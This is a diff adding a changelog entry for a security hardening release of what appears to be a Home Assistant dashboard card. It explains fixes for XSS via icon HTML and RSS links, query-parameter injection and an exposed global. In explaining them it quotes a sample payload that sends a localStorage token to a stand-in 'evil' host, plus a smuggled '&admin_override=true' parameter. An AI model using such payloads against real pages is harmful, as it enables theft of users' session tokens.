@@ -1,5 +1,69 @@
 # Versionsverlauf
 
+## Version 1.1.1614 - 2026-05-22
+
+**Title:** 🛡️ Security hardening pass — XSS, URL injection, defense-in-depth
+**Hero:** none
+**Tags:** Security, Hardening
+
+### Why
+
+Five-agent OWASP-style audit (driven by a Reddit "vibe-coding security" post) surfaced four real findings plus one defense-in-depth gap. None were exploited, none were drive-by reachable — all required either Dashboard-edit rights, a malicious RSS feed, or a compromised HA integration — but each was cheap to close. Bundled as one pass so the audit-to-fix delta is reviewable in a single commit.
+
+### What changed
+
+**1. `dangerouslySetInnerHTML` icon-string sanitization (XSS)**
+
+Three sites rendered icon HTML straight from untrusted sources via Preact's `dangerouslySetInnerHTML`:
+
+- `device.icon` from `hass.states` (compromised integration → script injection)
+- `preset.customIcon` from YAML card-config (Dashboard-edit user → script injection)
+- `control.icon` from config (same vector)
+
+New `src/utils/iconSanitizer.js` parses input with `DOMParser` (no loader side-effects), walks the tree, and drops anything outside an SVG-focused tag/attribute whitelist. Strips `<script>`, `<iframe>`, every `on*=` event handler, `javascript:`/`data:`/`vbscript:` URLs in `href`/`xlink:href`, and `expression()`/`javascript:` inside `style`. Wired into `ControlButton.jsx`, `PresetButtonsGroup.jsx`, and `ManagementView.jsx`.
+
+**2. NewsView external-link scheme check (XSS via RSS)**
+
+`handleOpenExternalLink` previously called `window.open(article.link, '_blank')` with the raw URL from the RSS feed. A malicious feed could ship `javascript:fetch('https://evil/?'+localStorage.token)` and execute it on click. Now requires `^https?://` and adds `noopener,noreferrer` to the `window.open` call.
+
+**3. `encodeURIComponent(entityId)` in REST API calls (query-parameter injection)**
+
+Three template-literal call sites built `?filter_entity_id=${entityId}` / `calendars/${eid}?…` without URL-encoding:
+
+- `src/utils/homeAssistantService.js:313`
+- `src/utils/historyUtils.js:62`
+- `src/system-entities/entities/calendar/index.jsx:103`
+
+HA validates server-side, but an entity-id containing `&admin_override=true` could theoretically smuggle parameters past client logic. Standard hygiene; mechanical fix.
+
+**4. `window._hass` made non-enumerable (defense-in-depth)**
+
+`DataProvider.jsx` still needs to expose `window._hass` for the boot-perf `waitForHass()` fallback (v1.1.1250) and two News debug helpers. Restricting properties would break those consumers. Instead: `Object.defineProperty(..., { enumerable: false })` so the global no longer shows up in `Object.keys(window)` scans by other cards/extensions sharing the page. Direct `window._hass` access still works for legitimate callers.
+
+**5. `stripHtml` switched from `el.innerHTML = …` to `DOMParser` (XSS via RSS)**
+
+`articleHelpers.js:52` set `tmp.innerHTML = html` on a detached div before reading `.textContent`. The `textContent` read was safe, but the `innerHTML` assignment itself fires `<img onerror>` loader attributes — even on a never-attached element. `DOMParser().parseFromString(html, 'text/html')` parses inert; no loader side-effects.
+
+### What did NOT change
+
+The audit also covered: hardcoded secrets/tokens, source-maps in `dist/`, external tracking/analytics endpoints, third-party CDN imports, `eval`/`new Function`, dynamic `hass.callService` domains, `ReDoS` regex patterns. All clean — nothing to fix.
+
+### Files
+
+- `src/utils/iconSanitizer.js` (new)
+- `src/utils/homeAssistantService.js`
+- `src/utils/historyUtils.js`
+- `src/components/controls/ControlButton.jsx`
+- `src/components/controls/PresetButtonsGroup.jsx`
+- `src/system-entities/entities/calendar/index.jsx`
+- `src/system-entities/entities/integration/components/ManagementView.jsx`
+- `src/system-entities/entities/news/NewsView.jsx`
+- `src/system-entities/entities/news/utils/articleHelpers.js`
+- `src/providers/DataProvider.jsx`
+- `src/components/tabs/SettingsTab/components/AboutSettingsTab.jsx` (version bump)
+
+---
+
 ## Version 1.1.1613 - 2026-05-21
 
 **Title:** 🪶 Slider-Footer-Label gap+padding entfernt
